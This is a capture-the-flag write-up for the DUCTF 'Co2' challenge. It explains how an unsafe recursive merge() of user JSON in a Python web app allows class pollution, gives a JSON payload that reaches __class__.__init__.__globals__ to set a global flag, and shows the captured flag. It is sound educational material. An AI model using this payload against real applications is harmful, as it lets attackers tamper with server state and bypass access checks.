Co2
============

Checking the code reveals that there is a save_feedback endpoint with a very interesting comment:
```py
    # Because we want to dynamically grab the data and save it attributes we can merge it and it *should* create those attribs for the object.
    merge(data, feedback)
    save_feedback_to_disk(feedback)
```
The user supplied data is being merged in with the feedback object to copy all of the attributes. This function does do the job just fine, and copies all the attributes over to the feedback object as seen in utils.py file. 
```py
def merge(src, dst):
    for k, v in src.items():
        if hasattr(dst, '__getitem__'):
            if dst.get(k) and type(v) == dict:
                merge(v, dst.get(k))
            else:
                dst[k] = v
        elif hasattr(dst, k) and type(v) == dict:
            merge(v, getattr(dst, k))
        else:
            setattr(dst, k, v)
```
However, in the process of writing the attributes to the destination object, it can also overwrite values for elements outside the scope of the object.
More information on this can be found in this article: https://blog.abdulrah33m.com/prototype-pollution-in-python/

There is also a get_flag function which simply checks if the `flag` value is set to `true` and returns the flag. However, this value is not directly in control of the user supplied input anywhere. Therefore, the class pollution vulnerability will have to leveraged.

Using the feedback mechanism we can simply craft the following payload and overwrite the value of flag while sending feedback which will be read in when reaching the /get_flag route.
```json
{
    "title":"",
    "content":"",
    "rating":"",
    "referred":"",
   "__class__": {
        "__init__":{
            "__globals__":{
                "flag": "true"
            }
        }
  }
}
``` 
Querying the /get_flag environment will now show the flag.
```
DUCTF{_cl455_p0lluti0n_ftw_}
```
